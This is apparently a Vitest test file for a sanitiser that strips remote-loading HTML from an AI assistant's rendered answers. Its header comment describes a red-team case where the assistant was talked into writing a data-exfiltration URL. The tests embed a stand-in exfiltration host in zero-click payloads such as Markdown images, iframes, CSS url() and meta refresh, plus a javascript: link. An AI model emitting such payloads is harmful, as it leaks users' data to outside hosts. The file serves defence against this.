// @vitest-environment jsdom
/**
 * S1 regression tests — the answer renderer must never fetch anything on its own.
 *
 * These exist because of the 2026-08-05 red-team (turn 32): the assistant was
 * talked into composing a data-exfiltration URL and putting it in an answer.
 * The model-side defence is unreliable (the same report shows a canary attack
 * succeeding 2 times in 3), so the guarantee has to live here, where it holds
 * regardless of what the model writes.
 *
 * See `docs/security/red-team-findings-2026-08-05.md`.
 */
import { describe, it, expect } from "vitest";
import { marked } from "marked";
import { sanitizeAnswerHtml } from "./sanitizeHtml";

const EVIL = "https://exfiltrate.server.net/data=secret";

/** Render the way the app does, then sanitise the way the app does. */
const render = (md: string) =>
  sanitizeAnswerHtml(marked.parse(md, { async: false, gfm: true, breaks: true }) as string);

describe("no zero-click remote loads", () => {
  it("drops a Markdown image — the actual exfiltration vector", () => {
    // This is the payload shape that would have fetched with NO user action.
    const html = render(`![receipt](${EVIL})`);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("exfiltrate.server.net");
  });

  it("drops raw <img>, including when the model writes HTML directly", () => {
    const html = sanitizeAnswerHtml(`<p>hi</p><img src="${EVIL}">`);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("exfiltrate.server.net");
    expect(html).toContain("hi"); // the real answer text survives
  });

  it.each([
    ["video", `<video src="${EVIL}"></video>`],
    ["audio", `<audio src="${EVIL}"></audio>`],
    ["iframe", `<iframe src="${EVIL}"></iframe>`],
    ["embed", `<embed src="${EVIL}">`],
    ["object", `<object data="${EVIL}"></object>`],
    ["svg image", `<svg><image href="${EVIL}"/></svg>`],
    ["picture/source", `<picture><source srcset="${EVIL}"></picture>`],
    ["remote stylesheet", `<link rel="stylesheet" href="${EVIL}">`],
    ["style tag", `<style>body{background:url(${EVIL})}</style>`],
    ["meta refresh", `<meta http-equiv="refresh" content="0;url=${EVIL}">`],
    ["base rewrite", `<base href="${EVIL}">`],
  ])("drops %s", (_label, payload) => {
    expect(sanitizeAnswerHtml(payload)).not.toContain("exfiltrate.server.net");
  });

  it("strips url() from an inline style without killing the style attribute", () => {
    const html = sanitizeAnswerHtml(`<mark style="background:url(${EVIL})">x</mark>`);
    expect(html).not.toContain("exfiltrate.server.net");
    expect(html).toContain("<mark");
  });
});

describe("what must keep working", () => {
  it("preserves the F020 masking highlight", () => {
    // maskEngine.ts wraps refilled values in exactly this shape. If the
    // sanitiser forbade `style` outright, masked values would stop being
    // visibly flagged — a silent regression in a shipped feature.
    const style = "background:#dcfce7;border-radius:3px;padding:0 2px";
    const html = sanitizeAnswerHtml(`<mark style="${style}">Ali Raza</mark>`);
    expect(html).toContain("<mark");
    expect(html).toContain("background:#dcfce7");
    expect(html).toContain("Ali Raza");
  });

  it("keeps ordinary answer formatting intact", () => {
    const html = render(
      "## Rule 6\n\n**Bold** and *italic*.\n\n- one\n- two\n\n| a | b |\n| --- | --- |\n| 1 | 2 |",
    );
    for (const frag of ["<h2", "<strong", "<em", "<ul", "<li", "<table", "<td"]) {
      expect(html).toContain(frag);
    }
  });

  it("keeps a web citation link clickable but not opener-leaking", () => {
    const html = sanitizeAnswerHtml(
      `<sup class="nq-web-cite"><a href="https://example.gov.pk/x" target="_blank">[W1]</a></sup>`,
      ["data-n", "target", "rel"],
    );
    expect(html).toContain("https://example.gov.pk/x");
    expect(html).toContain('target="_blank"');
    expect(html).toContain("noopener");
  });

  it("keeps the citation chip markup AnswerBody depends on", () => {
    const html = sanitizeAnswerHtml(`<sup class="nq-cite" data-n="3">[3]</sup>`, ["data-n"]);
    expect(html).toContain('data-n="3"');
    expect(html).toContain("nq-cite");
  });

  it("still blocks javascript: URLs (DOMPurify default, asserted so it stays)", () => {
    const html = sanitizeAnswerHtml(`<a href="javascript:alert(1)">x</a>`);
    expect(html).not.toContain("javascript:");
  });
});

describe("the test has teeth", () => {
  it("fails to find <img> only because we forbid it — default DOMPurify keeps it", async () => {
    // Sabotage check: prove the assertions above are testing our policy and not
    // some incidental behaviour of marked or DOMPurify. With the stock config
    // the image survives, which is precisely the hole S1 closes.
    const DOMPurify = (await import("dompurify")).default;
    const raw = marked.parse(`![x](${EVIL})`, { async: false }) as string;
    const stock = DOMPurify.sanitize(raw);
    expect(stock).toContain("<img");
    expect(stock).toContain("exfiltrate.server.net");
  });
});
